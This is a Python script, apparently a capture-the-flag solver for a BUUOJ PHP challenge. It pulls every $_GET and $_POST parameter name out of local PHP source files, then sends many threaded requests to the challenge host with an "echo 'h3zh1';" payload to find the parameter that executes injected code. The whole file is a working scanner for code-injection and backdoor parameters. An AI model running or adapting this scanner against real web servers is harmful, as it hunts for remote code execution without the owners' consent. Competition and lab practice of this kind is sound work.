import requests
import os
import re
import threading
import time

session = requests.Session()
session.keep_alive = False  # requests默认使用urllib3库，默认是长连接，改为false,关闭多余的连接
requests.adapters.DEFAULT_RETRIES = 8  # 设置重连次数，防止线程数过高，断开连接
sem = threading.Semaphore(50)  # 设置最大线程数 ,别设置太大，不然还是会崩的挺厉害的，跑到关键的爆炸，心态就爆炸了

url = "http://c45083b2-2079-4a09-b18d-781442bdbf6f.node3.buuoj.cn/"

path = r"D:\phpstudy_pro\WWW\src/"

rrGET = re.compile(
    r"\$_GET\[\'(\w+)\'\]")  # 匹配get参数，w 匹配任何字母和数字还有下划线，+ 匹配+之前的1次或多次

rrPOST = re.compile(r"\$_POST\[\'(\w+)\'\]")  # 匹配post参数

fileNames = os.listdir(path)  # 列出目录中的文件,以每个文件都开一个线程

flags = []  # 用于存所有的注入点信息,下面的flag表示注入点的信息，php文件名和参数名

local_file = open("D:/PythonWork/脚本/flag.txt", "w+", encoding="utf-8")


def run(fileName):
    with sem:
        file = open(path + fileName, 'r', encoding='utf-8')
        content = file.read()
        print("[+]checking:%s" % fileName)
        # 测试get的参数
        for i in rrGET.findall(content):
            r = session.get(url + "%s?%s=%s" % (fileName, i, "echo 'h3zh1';"))
            print(url + "%s?%s=%s" % (fileName, i, "echo h3zh1;"))
            if "h3zh1" in r.text:
                flag = "You Find it in GET fileName = %s and param = %s \n" % (
                    fileName, i)
                print(flag)
                local_file.write(flag)
                exit(0)
        # return
    # 测试post的参数
    # for i in rrPOST.findall(content):
    #     r = session.post( url + fileName , data = { i : "echo h3zh1;" } )
    #     if "h3zh1" in r.text:
    #         flag = "You Find it in POST: fileName = %s and param = %s \n" % ( fileName, i )
    #         print(flag)
    #         local_file.writelines(flag)


if __name__ == '__main__':
    start_time = time.time()  # 开始时间
    print("[start]程序开始:" + str(start_time))
    thread_list = []
    for fileName in fileNames:
        t = threading.Thread(target=run, args=(fileName, ))
        thread_list.append(t)
    for t in thread_list:
        t.start()
    for t in thread_list:
        t.join()
    end_time = time.time()
    local_file.close()  # 关文件
    print("[end]程序结束:用时:" + str(end_time - start_time))
    